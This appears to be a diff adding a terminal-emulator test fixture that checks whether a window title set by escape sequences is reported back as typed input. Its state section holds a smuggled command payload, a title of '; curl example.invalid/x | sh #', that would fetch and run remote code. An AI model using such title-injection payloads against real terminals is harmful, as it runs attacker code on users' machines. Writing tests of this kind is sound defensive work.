@@ -1,0 +1,18 @@
+size 70x6
+cursor 0,2 visible
+screen primary
+--- text
+00|a program that tries to have its own words typed back at it
+01|whatever was answered holds none of it
+02|
+03|
+04|
+05|
+--- attrs
+--- state
+title="; curl example.invalid/x | sh #
+pwd=
+modes 7 25 1007
+ansi-modes
+--- replies
+
